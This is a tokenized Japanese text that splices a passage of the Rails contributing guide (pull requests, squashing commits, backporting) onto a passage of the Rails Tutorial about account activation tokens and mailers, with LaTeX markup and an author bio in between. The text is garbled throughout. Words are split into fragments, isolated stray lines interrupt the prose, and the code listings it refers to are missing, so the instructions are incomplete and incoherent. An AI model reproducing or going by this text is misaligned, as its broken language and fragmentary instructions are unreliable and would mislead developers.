▁ プッシュ した Rails アプリケーションの リポジトリ を開いて ▁( ここでは https :// github . com / y our - user - name / rails ▁ に あるとします ) 、 右 ペ イン にある ▁[ P ul l ▁ Request s ] ▁ を クリック します 。
▁ 次の ページ で 右 上 隅 の ▁[ New ▁ pull ▁ request ] ▁ を 押 します 。
▁ 比 較 対象 の ブランチ を変更 したい場合は ▁[ Edit ] ▁ を クリック し 、 ( デフォルトで は master が 比 較 対象 になります )。 [ C li c k ▁to ▁create ▁a ▁ pull ▁ request ▁for ▁this ▁ com p ar is on ] ▁ を クリック します 。
▁ 自分 が 導入 した 変更 セット が含まれ ている ことを確認します 。
▁ 送信 したい パッチ の詳細 を 記 入 し 、 わかり やすい タイトル を 付け ます 。
▁ 終わっ たら 、[ S end ▁ pull ▁ request ] ▁ を 押 します 。
▁ 送信 した プルリクエスト は Rails コア チ ー ム に 知 ら されます 。
▁### ▁ フィード バ ッ ク を 受け 取 る
▁ 送信 した プルリクエスト が マージ される まで には 、 何 回 か 再 挑 戦 が 必要 になる でしょう 。
▁ あなた の プルリクエスト に対して 別の 意 見 を持つ コ ン ト リ ビュー タ が いる かもしれません 。 多くの 場合 、 プルリクエスト が マージ される まで に パッチ を 何 度 か 更新 する 必要 も ある でしょう 。
▁ GitHub の メール 通知 機能を オン に している Rails コ ン ト リ ビュー タ も います が 、 そう でない 人 も います 。
▁Rails に 携 わ っている 人 の ほとんど は ボ ラ ン テ ィ ア なので 、 プルリクエスト に 何らかの 反 応 が 生じる まで に 数 日 か か ること も ざ ら に あります 。 どう か め げ ずに プルリクエスト を ど し ど し 送信 してください 。
▁ び っ く り する ほど 早 く 反 応 が も ら え ること も あ れば 、 そう でない こともあります 。
▁ それ が オープン ソース という ものです 。
▁ 一 週 間 経 って も 何 の 音 沙汰 も ない ような ら 、 少し つ っ つ い てみましょう 。
▁[ rubyonrails - core メ ー リ ング リスト ]( http :// group s . g oo g le . com / group / rubyonrails - core / ) を ご 利用 ください 。
▁ プルリクエスト に 自分 で コメント を追加して み ても よいでしょう 。
▁ せ っ か く なので 、 自分の プルリクエスト への 反 応 を 待 っている 間 に 、 他の 人 の プルリクエスト を開いて コメント してみましょう 。
▁ あなた の パッチ に 反 応 が あった とき と お な じ ぐらい 、 その 人 た ち も き っ と 嬉 しく 思 う ことでしょう 。
▁### ▁ 必要な ら 何 度 でも ト ラ イ する
▁Rails に 貢 献 す べ く 活 動 し ていれば 、 その プルリクエスト は ここ を 変え た 方が よい の では ない か という フィード バ ッ ク を 受け ること が き っ と 一度 や 二 度 ある でしょう 。
▁ そう い う ことが あって も 、 どう か 落 ち 込 ま ない で ください 。 オープン ソース プロジェクト に 貢 献 する う え で 肝 心 な のは 、 コ ミ ュ ニ テ ィ の 知 恵 を 遠 慮 なく 活用 させ ても ら う ことです 。
▁ コ ミ ュ ニ テ ィ の メンバ ー が あなた のコード の 調 整 を 求 め ている のであれば 、 その とおり に して 再 送信 する 価 値 があります 。
▁その コードは Rails の コア に お く べ き では ない という フィード バ ッ ク を 受け た なら 、 gem の 形 で リリース する 方が よい かもしれません 。
▁#### ▁ コミット を ス カ ッ シ ュ する
▁Rails に 貢 献 する 皆 様 には 、 必ず 「 コミット を ス カ ッ シ ュ 」 して い ただ く よう お 願 い します 。 ス カ ッ シ ュ とは 、 複数の コミット を ひとつ に まとめ ること です ▁( 訳 注 : ▁ 後 述 の ` git ▁ re base ▁- i ` で ス カ ッ シ ュ できます )。
▁ プルリクエスト は 、 ひとつ の コミット に まとめ ておく ことが 望 まれ ます 。
▁ コミット を ひとつ に まとめ ること で 、 安 定 版 ブランチ に 新しい 変更を バ ッ ク ポート し や す く なり 、 よく ない コミット を 取り 消 し や す く なり 、 Git の 履 歴 を 多 少 なり とも 追 い や す く なります 。
▁Rails は 巨 大 プロジェクト であり 、 異 質 な コミット が 多 数 加 わ ると 膨 大 な ノ イ ズ が 生じる 可能性があります 。
▁以下の 作業 を行う には 、 メ イン の Rails リポジトリ を指す Git リモート を 取得 する必要があります 。
▁ Git リモート は 他の 場 面 でも 何か と 便利な ものです が 、 まだ 作成 していない 場合は 以下 を 最初に 行 って ください 。
▁$ ▁git ▁ remote ▁ add ▁ up st re am ▁ https :// github . com / rails / rails . git
▁この リモート は up st re am 以外の 名前 にも 設定 できます 。 ` up st re am ` という 名前 に した く ない場合は 、 以下の 手順 に従って 名前 を変更 します 。
▁ リモート ブランチ 名 が ` my _ pull _ request ` の場合は 、 以下 を実行します 。
▁$ ▁git ▁f e t ch ▁ up st re am
▁$ ▁git ▁ checkout ▁ my _ pull _ request
▁$ ▁git ▁ re base ▁ up st re am / master
▁$ ▁git ▁ re base ▁- i
▁< ▁ 最初の ひとつ を 除 く すべての コミット に対して ' s q u a sh ' を 選択 する ▁ >
▁< ▁ コミット メッセージ を 編集 して 、 すべての 変更を わかりやすく 記述 する ▁ >
▁$ ▁git ▁ push ▁ origin ▁ my _ pull _ request ▁- f
▁以上で GitHub 上の プルリクエスト を 更新 できるように なり 、 実際に 更新 された ことを確認 できます 。
▁#### ▁ プルリクエスト を更新する
▁ あなた が コミット した コード に対して 変更を 求 め られ る ことがあります 。
▁ 既存の コミット そのもの を修正する ことを 求 め られ る こともあります 。
▁ただし 、 Git では 既存の コミット を さ か の ぼ って 変更 した もの を プッシュ すること は 許 されていません 。 既に プッシュ された ブランチ と ローカル の ブランチ が 一 致 しない からです 。
▁ このような 場合は 、 新しい プルリクエスト を作成する 代わりに 、 コミット の ス カ ッ シ ュ について 既に 説明 した 方法 を使用して 、 自分の ブランチ を GitHub に 強 制 的に プッシュ することもできます 。
▁これにより 、 GitHub 上の ブランチ と プルリクエスト が 新しい コード によって 更新 されます 。
▁ 強 制 的に プッシュ を行う と 、 リモート ブランチ の コミット が 失 わ れる 危 険 性 があります ので 、 く れ ぐ れ も ご注意ください 。
▁### ▁ 旧 バージョンの Ruby ▁on ▁Rails
▁ 以前の バージョンの Ruby ▁on ▁Rails に 修正 パッチ を 当 て たい場合は 、 設定 を行って ローカル の ト ラ ッ キ ング ブランチ に 切り 替 え る必要があります 。
▁たとえば 4 - 0 - s table ブランチ に 切り 替 え る 場合は 以下のように します 。
▁$ ▁git ▁ branch ▁-- t rack ▁4 - 0 - s table ▁ origin / 4 - 0 - s table
▁$ ▁git ▁ checkout ▁4 - 0 - s table
▁ TIP : ▁[ シ ェ ル の プロンプト に Git ブランチ 名を 表示 ]( http :// q ug start . com / blog / git - and - s v n / add - c ol or ed - git - branch - name - to - y our - sh e ll - pro m p t / ) すると 、 今 どの バージョン で 作業 している か が その 場 で 確認 できる ので 便利です 。
▁#### ▁ バ ッ ク ポート
▁ 変更 が master に マージ される と 、 その 変更 は Rails の 次 期 メ ジ ャ ー リリース に 採 用 されます 。
▁ 常に という わけではありません が 、 変更を 過 去 の 安 定 版 の メ ン テ ナ ン ス 用 に バ ッ ク ポート できる と よい 場合 があります 。
▁ 一般に 、 セキュリティ 修正 と バグ 修正 は 、 バ ッ ク ポート の 候 補 になります 。 新 機能 や 動作 変更 用 パッチ は バ ッ ク ポート の 候 補 には 採 り 入 れ られ ません 。
▁ 自分の 変更 が どちら に 該当する か わ から ない場合は 、 余 分 な 作業 を せずに 済 む ために も 、 変更を バ ッ ク ポート する 前に Rails チ ー ム の メンバ ー に ご 相 談 ください 。
▁ 単純な 修正 を バ ッ ク ポート する 最も 簡単な 方法は 、[ master と 自分の 変更 の d if f を と って 対象 ブランチ に適用 する ]( http :// ar i e j an . net / 200 9 / 10 / 2 6 / h o w - to - create - and - app ly - a - patch - with - git ) ことです 。
▁最初に 、 master と 自分の 変更 の d if f 以外に 差 分 がない ことを確認します 。
▁$ ▁git ▁ log ▁ master . .
▁次に d if f を 展開 します 。
▁$ ▁git ▁ format - patch ▁ master ▁-- st d out ▁ > ▁ ~ / my _ change s . patch
▁ 対象 ブランチ に 切り 替 え て 変更を 適 用 します 。
▁$ ▁git ▁ checkout ▁- b ▁ my _ b ack port _ branch ▁3 - 2 - s table
▁$ ▁git ▁app ly ▁ ~ / my _ change s . patch
▁ 単純な 変更 であれば これ で 十分 バ ッ ク ポート できます 。
▁しかし 、 複雑な 変更 を行って いた 場合 や 、 master と 対象 ブランチ の 差 が 甚 だ しく な っている 場合は 、 もう少し 手 を加え る 必要がある かもしれません 。
▁ バ ッ ク ポート が どの ぐらい 難 し くなる か は 場合 によって 大きく 異なります 。 ときに は 、 それ ほど の 手 間 を かけ て バ ッ ク ポート する ほど の 意味 がない こともあります 。
▁ コ ン フ リ ク ト をすべて 解 消 して すべての テストが パス する ことを確認 できた ら 、 変更を プッシュ して 、 バ ッ ク ポート 用の プルリクエスト を 別 に 作成 します 。
▁なお 、 古 い ブランチ では ビ ル ド の ター ゲ ッ ト が master と 異なる セット になっている 場合 があります ので ご注意ください 。
▁ でき れば 、` . tr a v is . yml ` に記載されている バージョンの Ruby を使用して バ ッ ク ポート を ローカル で テスト して から プルリクエスト を 送信 するようにしてください 。
▁Rails コ ン ト リ ビュー タ
▁ master や doc rails への 貢 献 が 認 め られ た 方 々 は [ Rails コ ン ト リ ビュー タ ]( http :// c ontributor s . rubyonrails . org ) に その 名を 連 ね ています 。
▁ ど な た でも Rails ガイド の 改 善 に 貢 献 することができます 。 Rails ガイド に 求 め られ る 改 善 とは 、「 一 貫 している こと 」 「 矛 盾 が ないこと 」 「 読み やすい こと 」 「 情報 の 追加 」 「 事 実 と 異 な っている 部分 の 修正 」 「 タ イ ポ の 修正 」 「 最新の ed g e ▁Rails に 追 い 付 く こと 」 など です 。
▁class ▁ Application ▁< ▁Rails :: Application
▁\ href { http :// www . michael hartl . com /}{ マ イ ケ ル ハ ート ル ▁( Michael ▁Hartl ) } ▁ は 「\ href { http :// www . railstutorial . org /}{ \ emph { Ruby ▁on ▁Rails ▁ チュートリアル } }」 という ▁Web ▁ 開発 を 始 め る ときに 最も よく 参 考 に される 本 の 著者 です 。 また 、\ href { http :// www . s of t co ver . io /}{ S of t co ver } ▁という 自 費 出 版 プラットフォーム の 共 同 創 業 者 で もあります 。
▁ 以前 は 、 ( 今 では す っかり 古 く な っ てしまい ましたが ) 「\ emph { Rails S p a ce }」 という 本 の 執 筆 および 開発 に 携 わ った り 、 また 、 ▁ 一時 人 気 を 博 した ▁Ruby ▁on ▁Rails ▁ ベース の ソ ー シ ャ ル ネ ッ ト ワ ー キ ング プラットフォーム 「 In s o sh i 」 の 開発 にも 携 わ っ ていました 。
▁なお 、 20 11 年 には 、 Rails ▁ コ ミ ュ ニ テ ィ への 高 い 貢 献 が 認 め られ て 、\ href { http :// ruby her o es . com / her o es } { Ruby ▁ H er o ▁A w ar d } ▁ を 受 賞 しました 。
▁\ href { http :// co ll e g e . h ar v ar d . ed u /}{ ハ ー バー ド 大 学 } 卒 業 後 、\ href { http :// re s ol ver . c alt e ch . ed u / C alt e ch E T D : e td - 0 5 22 200 3 - 16 16 2 6 } { カ リ フ ォ ル ニ ア 工 科 大 学 } で \ href { http :// www . c alt e ch . ed u /}{ 物 理 学 博 士 号 } を取得し 、 起 業 プログラム ▁\ href { http :// y com bin at or . com /}{ Y ▁ Co m bin at or } ▁ の 卒 業 生 で もあります 。
▁ 第 \ ref { cha : updating _ show ing _ and _ de let ing _ users } 章では 、 基本的な Users リソース ▁( 表 \ ref { table : RESTful _ users } の 標準的な REST アクション をすべて 使用 ) ▁ と 、 自 由 道 の 高 い 認 証 ▁( authentication ) ▁ および 認 可 ▁( author i z ation ) ▁ システム を作成し ました 。
▁ 本 章では この システム の 仕 上 げ として 、 互 い に 強 く 関連 している 2 つの 機能 、 す な わ ち アカウント の 有効化 ▁( ア ク テ ィ ベ ー ション : ▁ 新規ユーザー の メールアドレス が 有効 である ことを確認する 機能 ) ▁ と 、 パスワード の 再 設定 ▁( パスワードを 忘れ て し ま った ユーザー 向け の 機能 ) ▁ を実装する ことにします 。
▁これらの 機能 ごとに 新しい リソース を作成し 、 それぞれの コントローラ / ルーティング / データベース 移 行 の例 について 見 て い く ことにします 。
▁その 途 中 で 、 Rails の 開発環境 や 本番環境 から メールを送信 する方法について も 学習 します 。
▁最後に 、 2 つの 機能を 完全に 連 携 させ ます 。 パスワードを 再 設定 すると 、 パスワード再設定 用の リンク が メール で 送信 され 、 その 宛 先 メールアドレス が 有効 であること は 最初の アカウント有効化 で 確認 済み である 、 といった 具 合 です
▁\ foo t not e {
▁ 細 か い ことを 言 えば 、\ ref { sec : updating _ users } の アカウント 設定 更新 機能 を使って 、 お か し な メールアドレス を設定する ことも できてしまいます 。 ここで 行う 実装 では 、 メール による メールアドレス 検証 の メ リ ッ ト を ▁( や り す ぎ ない 範囲 で ) ▁ 十分 享 受 できる はずです 。
▁ }< n >< n >\ section { Account ▁ activation } ▁% ▁( fold )< n >\ label { sec : account _ activation }< n >< n >
▁ 今 の 状態 では 、 新しく アカウント を 登録 した ユーザー は アカウント に対する フル アクセス 権限 を 持 っています ▁( 第 \ ref { cha : sign _ up } 章 ) ▁ が 、 このままでは い か にも 大 雑 把 です 。
▁ そこで 、 アカウントを有効化する 手順 を 実装 して 、 ユーザーが 登録 に 使用 した メールアドレスを 本当に 所 有 、 管理 している の かどうかを確認 する ように しましょう 。
▁これ を行う お お よ その 流れ は 、 有効化トークン や ダイジェスト を ユーザー と 関連付け 、 ユーザーに メールを送信 し 、 その メール には トークン を含む リンクを 記 載 しておき 、 ユーザーが その リンクをクリックすると 有効化 できるように な る 、 という ものです 。
▁ アカウントを有効化する 段 取り は 、 ユーザー ログイン ▁(\ ref { sec : log g ing _ in }) 、 特に ユーザーの 記 憶 ▁(\ ref { sec : remember _ me }) ▁ と似ています 。
▁ 基本的な 手順 は 次の ようになります 。
▁ユーザーの 初期 状態 は 「 有効化 されていない 」( un activat ed ) ▁ に しておく 。
▁ ユーザー登録 が 行われた ときに 、 有効化トークン と 、 それ に対応する 有効化 ダイジェスト を生成する 。
▁ 有効化 ダイジェスト は データベースに保存 しておき 、 有効化トークン は メールアドレス と 一 緒 に 、 ユーザーに 送信 する 有効化 用 メールの リンク に 仕 込 んで お く
▁ せ っ か く ユーザー ID が 既に アプリケーションの URL で そのまま 使われ ている のです から 、 メールアドレス の代わりに ユーザー ID を使う という 手 も もちろん あります 。 ただ 、 メールアドレス に しておけば 、 将来 何らかの 理由 で ユーザー ID を ぼ か しておき た くなる 場合に 役 に 立 つ かもしれません ▁( 競 合 他 社 が あなた の アプリケーションの ユーザー 数 を 推測 し にくい ように したい 、 など )。
▁ ユーザーが メールの リンクを クリック した ら 、 アプリケーション は メールアドレスを キー に して ユーザー を探し 、 データベース 内に 保存 して お いた 有効化 ダイジェスト と 比 較 することで トークン を 認 証 する 。
▁ ユーザーを 認 証 できた ら 、 ユーザーの ステータス を 「 有効化 されていない 」 から 「 有効化 済み 」( activat ed ) ▁ に変更 する 。
▁ 都 合 の 良い ことに 、 今回 実装 する アカウント有効化 や パスワード再設定 の 仕組み と 、 以前 に 実装 した パスワード や 記憶トークン の 仕組み には よく 似 た 点 が多い ので 、 多くの ア イ デ ア を 使い 回 す ことができます ▁(\ ko de { User . digest } メソッド 、\ ko de { User . new \_ token } メソッド 、 改 造 版 の \ ko de { user . authenticated ?} メソッド など )。
▁ 表 \ ref { table : password _ token _ digest } に 両者 の 似 ている 点 を示します ▁(\ ref { sec : password _ reset } の パスワード再設定 も 含 む )。
▁\ ref { sec : activat ing _ the _ account } . の 表 \ ref { table : password _ token _ digest } ▁ を元に 、 より 一 般 性 の 高 い \ ko de { authenticated ?} メソッド を定義する ことにします 。
▁ 検索 キー
▁ authenticated ? (: remember , ▁ token )
▁ authenticated ? (: activation , ▁ token )
▁ authenticated ? (: reset , ▁ token )
▁ ログイン / 記憶トークン / アカウント の 有効化 / パスワード の 再 設定 で 似 ている 点
▁それでは いつものように 、 Git で 新 機能 用の トピックブランチ を作成し ましょう 。
▁\ ref { sec : email _ in _ production } で説明した とおり 、 アカウント の 有効化 と パスワード の 再 設定 では 、 メールの 設定 部分 に 共通 する ところ があります ので 、 その 部分を 両 機能 に適用 して から Git の master に マージ します 。
▁ こうすることで 共通 の トピックブランチ を 使えるように なり 、 便利です 。
▁ master
▁ セッション 機能 ▁(\ ref { sec : sessions _ and _ failed _ login }) ▁ を使用して 、 アカウント の 有効化 という 作業 を 「 リソース 」 として モデル 化 する ことにします 。 アカウント の 有効化 リソース は Active ▁Record の モデルと はこの 際 関係 ないので 、 両者 を 関連付け ること は しません 。
▁その 代わりに 、 この 作業 に 必要な データ ▁( 有効化トークン や 有効化 ステータス など ) ▁ を User モデル に追加する ことにします 。
▁ こう い う 場合は \ ko de { update } アクションに する の では ない か と お 思い の 方 も いる でしょう 。 しかし 、 有効化 リンク は メール で ユーザーに 送 られ る ことを思い出してください 。 この リンクを クリック すれば 、 ブラウザで 普通 に クリック した の と同じ こと になり 、 ブラウザから 発 行 される のは ▁(\ ko de { update } アクション で使用する \ text tt { PATCH } リクエスト ではなく ) ▁ 必 然 的に \ text tt { GET } リクエスト になります 。 GET リクエストを 受け る には edit アクションに なら ざ る を 得 ない わ け です 。
▁This
▁\ ko de { edit } アクション を 使い たい のです から 、 コマンドライン で \ ko de { edit } と 指定 すれば よい ように 思 え ます が 、 そう すると 使い も しない edit ビュー や テスト まで 生成 され てしまう のです 。
▁$ ▁ rails ▁ generate
▁-- no - test - f r am e w or k
▁上の コマンド では 、 テスト を生成し ない という オプションを 指定 している ことにご注目ください 。
▁ 著者 は コントローラの テスト よりも 統合テスト ▁(\ ref { sec : activation _ test _ and _ refactoring }) ▁ の 方が 望 ま しい と 考え ている ので 、 コントローラの テスト を生成し ないように している のです 。
▁ 有効化 メール では 以下の 形式 の URL を使用します 。
▁これは 、\ ko de { edit } アクション への 名前付きルート が 必要 になる ということです 。
▁この 変更 は 、 ルーティング ファイルの \ ko de { resources } 行 で 行います ▁( リスト \ ref { code : account _ activation s _ route })。
▁ アカウント有効化 に 使用する リソース を追加する
▁続いて 、 一意 の 有効化トークン が ユーザー 有効化 に 必要 です 。
▁ password
▁ token
▁たとえば 、 攻撃者が 仮 に データベース にアクセス でき てしまう と 、 攻撃者が 作成した 新しい アカウント を 即 座 に 有効 にする ことができ てしまいます 。 攻撃者 は その アカウント で ゆ う ゆ う と ログイン し 、 パスワード を変更 して その アカウント の 権限 を 手 に 入 れる ことでしょう 。
▁ following
▁ ダイジェスト
▁これにより 、 以下 を使用して 有効化トークン にアクセス し 、
▁ 以下のような コード で ユーザーを 認 証 できるようになります 。
▁( これ を行う には リスト \ ref { code : authenticated _ p } の \ ko de { authenticated ?} メソッドを 改良 する必要があります )。
▁続いて 、\ ko de { activat ed } 属性 を追加して 論理値 ▁( true / false ) ▁ を 取 るように します 。 これ で 、\ ref { sec : admin ist r at ive _ users } で説明した 自動生成 の 論理値 メソッド と同じ ような 感 じ で 、 ユーザーが 有効 である かどうかを テスト できるように な r
▁最後に 、 本チュートリアルで 使う ことはありません が 、 ユーザー を有効に した とき の 日 時 も 念 のために 記 録 しておきます 。
▁ 変更 後 の データモデル は 図 \ ref { fig : user _ model _ account _ activation } のようになります 。
▁User モデルに ユーザー 有効化 用の 属性 を追加する
▁以下の マイグレーション を コマンドライン で 実行 して 図 \ ref { fig : user _ model _ account _ activation } の データモデル を追加する と 、 3 つの 属性 が 新しく 追加 されます 。
▁( 上 記 の 2 行 目 にある ▁' > ' ▁という 文字 は 、 改 行 を 示す ために シ ェ ル が自動的に 挿 入 する 文字 です 。 手動で 入力 しない よう 、 注意 してください ) ▁\ ko de { admin } ▁ 属性 ▁( リスト \ ref { code : admin _ migration }) ▁ の 時 と同様に 、\ ko de { activat ed } 属性 の デフォルトの 論理値 を \ ko de { false } に します ▁( リスト \ ref { code : add _ activation _ to _ users _ migration })。
▁ アカウント有効化 用の 属性 と インデックス を追加する マイグレーション
▁< n > ▁end
▁ いつものように マイグレーション を実行します 。
▁$ ▁bundle ▁exec ▁rake ▁ db : migrate
▁ ユーザーが 新しい 登録 を 完了 するために は 必ず アカウント の 有効化 が 必要 になる のです から 、 有効化トークン や 有効化 ダイジェスト は ユーザー オブジェクトが 作成される 前に 作成 しておく必要があります 。
▁これ に よく 似 た 状 況 を \ ref { sec : uniqueness _ validation } でも 説明 しました 。 メールアドレス をデータベースに保存する 前に 、 メールアドレスを 全 部 小文字 に変換 する必要が あった ので した 。
▁ あ のとき は 、\ ko de { before \_ save } コールバック に \ ko de { downcase } メソッドを バ イン ド しました ▁( リスト \ ref { code : email _ downcase })。
▁ オブジェクト に \ ko de { before \_ save } コールバック を 用 意 しておく と 、 オブジェクトが 保存 される 直 前 、 オブジェクトの 作成 時 や 更新 時に その コールバック が 呼び出され ます 。 しかし 今回は 、 オブジェクト が作成され たとき だけ コールバック を 呼び出し たい のです 。 それ以外の ときに は 呼び出し たくない のです 。
▁ そこで \ ko de { before \_ create } コールバック が 必要 になります 。 この コールバック は 以下のように 定義 できます 。
▁上のコードは \ emph { メソッド 参 照 } と呼ばれる もの で 、 こうすることで Rails は \ ko de { create \_ activation \_ digest } という メソッド を探し 、 ユーザー を作成する 前に 実行 する ようになります
▁( リスト \ ref { code : email _ downcase } では 、\ ko de { before \_ save } に 明示的に ブロック を渡して い ましたが 、 メソッド 参 照 の 方が 一般に お勧め できます )。
▁ private
▁ クラス 内で \ ko de { private } キーワード より 下 に 記述 した メソッドは 自動的に 非 公開 となります 。 この ことは コンソール セッション で すぐ 確かめ られます 。
▁$ ▁ rails ▁console
▁ 今回 \ ko de { before \_ create } コールバック を使用する 目的 は 、 トークン と それ に対応する ダイジェスト を 割り当て る ためです 。 割り当て は 以下のように 行う ことができます 。
▁ このコード では 、 記憶トークン で 使用 した トークン の メソッド や ダイジェスト の メソッドを スト レ ート に 使い ま わ しています 。 リスト \ ref { code : user _ model _ remember } の \ ko de { remember } メソッドと 比 べ てみましょう 。
▁# ▁ 永 続 セッション のために ユーザーを データベースに 記 憶 する
▁ 主 な 違 い は 、 後 者 の \ ko de { update _ attribute } の 使い 方 に あります 。
▁ こ の違い は 、 記憶トークン や ダイジェスト は 既に データベースに いる ユーザーの ために 作成される ▁( その 分 や り やすい ) ▁ の に 対 し 、\ ko de { before _ create } コールバック の 方は ユーザーが 作成される \ emph { 前 } に 呼び出される ▁( その 分 面倒 ) ▁ ことが 原 因 です 。
▁この コールバック がある ことで 、 ( リスト \ ref { code : create _ action _ strong _ parameters } で ユーザー登録 を 行った ときに ) \ ko de { User . new } で 新しい ユーザーが 定義 される と 、\ ko de { activation \_ token } 属性 や \ ko de { activation \_ digest } 属性を 自動的に 得られ ます 。 後 者 の activation _ digest 属性 は 既に データベースの カラム と の 関連付け が でき あ が っている ▁( 図 \ ref { fig : user _ model _ account _ activation }) ▁ ので 、 ユーザーが 保存 される ときに 一 緒 に 自動 保存されます 。
▁ 上 で説明した ことを User モデルに 実装 すると リスト \ ref { code : user _ model _ activation _ code } のようになります 。
▁ 有効化トークン は 本 質 的に 仮 の もの で なければならない ので 、 この モデルの \ ko de { attr \_ accessor } に もうひとつ 追加 しました 。
▁ メールアドレスを 小文字 に するときに も メソッド 参 照 が 使用される 機 会 がある ことにご注目ください 。
▁User モデルに アカウント有効化 のコード を追加する
▁ email
▁< n > ▁end
▁ 先 に進む前に 、 サンプルデータ と フィクスチャ も 更新 し 、 テスト 時の サンプル と ユーザーを 事 前に 有効化 しておきましょう ▁( リスト \ ref { code : s e ed _ users _ activat ed } と リスト \ ref { code : fixture _ users _ activat ed })。
▁なお 、\ ko de { Time . zone . now } は Rails の 組み込み ヘルパー であり 、 サーバー の タイムゾーン に 応 じ た タイムスタンプ を返します 。
▁ サンプル ユーザーを 最 初 から 有効 に しておく
▁ フィクスチャ のユーザー を有効に しておく
▁ 例
▁ いつものように データベース を 初期化 して 、 サンプルデータ を 再度 生成 し 直 し 、 リスト \ ref { code : s e ed _ users _ activat ed } の 変更を 反 映 します 。
▁$ ▁bundle ▁exec ▁rake ▁ db : migrate : reset < n > $ ▁bundle ▁exec ▁rake ▁ db : s e ed
▁ データ の モデル 化 が 終わっ たので 、 今度は アカウント有効化 メールの 送信 に 必要な コード を追加しましょう 。
▁このメソッド では Action ▁Mailer ライブラリ を使用して User の \ emph { メイラー } を追加します 。 この メイラー は Users コントローラの \ ko de { create } アクション で 有効化 リンクを メール 送信 するために 使用します 。
▁ メイラー の 構成 は コントローラのアクション と よく 似 ており 、 メールの テンプレート を ビュー と 同じ要領で 定義 できます 。
▁この節では メイラー と ビュー を定義し て 、 有効化トークン と メールアドレス ▁( = 有効 にする アカウント の アドレス ) ▁ を含む リンクを そ の中で 使用します 。
▁ メイラー は 、 モデル や コントローラ と同様に \ ko de { rails ▁ generate } で 生成 できます 。
▁上の コマンド を実行し た ことで 、 本 節 で 必要となる \ ko de { account _ activation } メソッドと 、 次 節 ▁(\ ref { sec : password _ reset }) ▁ で 必要となる \ ko de { password _ reset } メソッド が生成され ました 。
▁ 生成 した メイラー ごとに 、 ビュー テンプレート が 2 つ ず つ 生成されます 。 1 つ は テキスト メール 用の テンプレート 、 1 つ は HTML メール 用 テンプレート です 。
▁ アカウント有効化 メイラー メソッドの テンプレート を リスト \ ref { code : generated _ account _ activation _ view _ text } と リスト \ ref { code : generated _ account _ activation _ view _ html } に示します 。
▁ アカウント有効化 メイラー の テキスト ビュー ▁( 自動生成 )
▁ アカウント有効化 メイラー の HTML ビュー ▁( 自動生成 )
▁ 生成された メイラー の動作 を簡単に 追 って みましょう ▁( リスト \ ref { code : generated _ application _ mailer } と リスト \ ref { code : generated _ user _ mailer })。
▁リスト \ ref { code : generated _ application _ mailer } には 、 デフォルトの \ ko de { from } アドレス ▁( アプリケーション 全体 で 共通 ) ▁ があります 。 リスト \ ref { code : generated _ user _ mailer } の 各 メソッド には 宛 先 メールアドレス もあります 。
▁リスト \ ref { code : generated _ application _ mailer } では メールの フォーマット に対応する メイラー レイアウト も 使用 されています 。 なお 本チュートリアル の 説明 には 直接 関係 ありません が 、 生成される HTML メイラー の レイアウト や テキスト メイラー の レイアウト は \ ko de { app / views / layouts } で 確認 できます 。
▁ 生成された コード には インスタンス変数 \ ko de {@ g re e t ing } も 含まれています 。 この インスタンス変数 は 、 ち ょ う ど 普通 の ビューで コントローラの インスタンス変数 を 利用できる の と同じ ように 、 メイラー ビューで 利用 できます 。
▁ 生成された Application メイラー
▁ 生成された User メイラー
▁最初に 、 生成された テンプレート を カスタマイズ して 、 実際に 有効化 メール で 使えるように します ▁( リスト \ ref { code : application _ mailer })。
▁次に 、 ユーザー を含む インスタンス変数 を作成して ビューで 使えるように し 、\ ko de { user . email } に メール 送信 します ▁( リスト \ ref { code : mail _ account _ activation })。
▁ 新しい デフォルトの \ ko de { from } アドレス を使用する アプリケーション メイラー
▁ アカウント有効化 リンクを メール 送信 する
▁ テンプレート ビュー は 、 通常の ビュー と同様 ERB で 自由に カスタマイズ できます 。 ここでは 挨拶 文 に ユーザー名 を含め 、 カスタム の 有効化 リンク を追加します 。
▁ この後 、 Rails サーバー で ユーザーを メールアドレス で 検索 して 有効化トークン を 認 証 できるように したい ので 、 リンク には メールアドレス と トークン を 両方 含 め ておく 必要があります 。
▁ Account A ct i v ation s リソース で 有効化 を モデル 化 した ので 、 トークン 自体 は リスト \ ref { code : account _ activation s _ route } で定義した 名前付きルート の 引数 で 使用されます 。
▁ここで 思い 出 してみましょう 。
▁上の メソッドは 、 以下の 形式 の URL を生成します 。
▁ http :// www . example . com / users /1/ edit
▁これ に対応する アカウント有効化 リンク の ベース URL は以下のようになります 。
▁ http :// www . example . com / account _ activation s / q 5 lt 3 8 h Q D c _ 9 59 P V oo 6 b 7 A / edit
▁上の URL の 「\ ko de { q 5 lt 3 8 h Q D c \_ 9 59 P V oo 6 b 7 A }」 という 部分 は \ ko de { new \_ token } メソッドで 生成された ものです ▁( リスト \ ref { code : token _ method })。 URL で 使用 できるように Base 64 で エンコード されています 。 これは ち ょ う ど / users /1/ edit の 「 1 」 のような ユーザー ID と同じ 役 割 を 果 た します 。
▁この トークン は 、 特に A ct i v ation s コントローラの \ ko de { edit } アクション では \ ko de { params } ハッシュ で \ ko de { params [: id ]} として 参 照 できます 。
▁\ emph { クエリ パラメータ } を使用して 、 この URL に メールアドレス も うまく 組 み 込 んで みましょう 。 クエリ パラメータ とは 、 URL の 末尾 で 疑問符 「 ? 」 に 続けて キー と 値 の ペ ア を 記述 した ものです
▁ email = foo % 4 0 example . com
▁この ように して 名前付きルート で クエリ パラメータ を定義する と 、 Rails が 特殊な 文字 を 自動的に エスケープ してくれます 。
▁ コントローラ で \ ko de { params [: email ]} から メールアドレスを 取り出す ときに は 、 自動的に エスケープ を 解 除 してくれます 。
▁ ここ まで でき れば 、 リスト \ ref { code : mail _ account _ activation } で定義した \ ko de {@ user } インスタンス変数 、 edit への 名前付きルート 、 ERB を 組み合わせ て 、 必要な リンク を作成 できます ▁( リスト \ ref { code : account _ activation _ view _ text } と リスト \ ref { code : account _ activation _ view _ html })。
▁リスト \ ref { code : account _ activation _ view _ html } の HTML テンプレート では 、 正しい リンクを 組 立 て るために \ ko de { link \_ to } メソッドを 使用している ことにご注目ください 。
▁ アカウント有効化 の テキスト ビュー
▁ アカウント有効化 の HTML ビュー
▁リスト \ ref { code : account _ activation _ view _ text } や リスト \ ref { code : account _ activation _ view _ html } で定義した テンプレート の 実際の 表示 を簡単に 確認 するために 、\ emph { メール プレビュー } という 裏 技 を使って みましょう 。 Rails では 、 特殊な URL にアクセス すると メールの メッセージ を その 場 で プレビュー することができます 。 メール を 実際に 送信 し なくても よい ので 大 変 便利です 。
▁ これを 利用 するには 、 アプリケーションの development 環境 の設定 に 手 を加え る必要があります ▁( リスト \ ref { code : development _ email _ settings })。
